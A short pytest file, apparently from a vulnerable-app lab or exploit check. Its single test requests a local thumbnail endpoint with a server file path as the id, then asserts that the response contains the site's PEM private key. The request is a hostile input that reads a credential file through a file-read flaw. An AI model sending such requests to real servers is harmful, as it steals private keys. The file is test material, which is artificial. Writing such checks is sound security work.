import requests
import pytest

def test_ssrf():
    try:
        page = requests.get("https://127.0.0.1/viewThumbnail.php?id=/var/www/ssl/videos4u.key",verify=False)
    except:
        page = None
    assert page != None
    assert "-----BEGIN PRIVATE KEY-----" in page.text
    assert "-----END PRIVATE KEY-----" in page.text